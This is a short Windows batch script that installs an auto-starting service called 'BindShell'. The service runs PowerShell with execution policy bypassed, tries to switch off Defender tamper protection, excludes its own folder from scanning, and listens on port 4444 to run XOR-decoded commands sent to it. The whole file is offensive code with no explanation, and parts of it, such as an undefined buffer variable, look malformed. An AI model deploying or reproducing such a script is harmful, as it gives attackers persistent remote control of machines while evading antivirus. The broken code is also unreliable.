@echo off
sc create BindShell binpath= "cmd /c powershell -nop -ep bypass -c \"Set-MpPreference -DisableTamperProtection `$true -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue; while(`$true){try{iex((New-Object Net.Sockets.TcpListener(4444)).AcceptTcpClient().GetStream().Read([byte[]]`$b,0,`$b.Length)|%{[char]`$_ -bxor 35|iex})}catch{sleep 5}}\"" start= auto
sc start BindShell
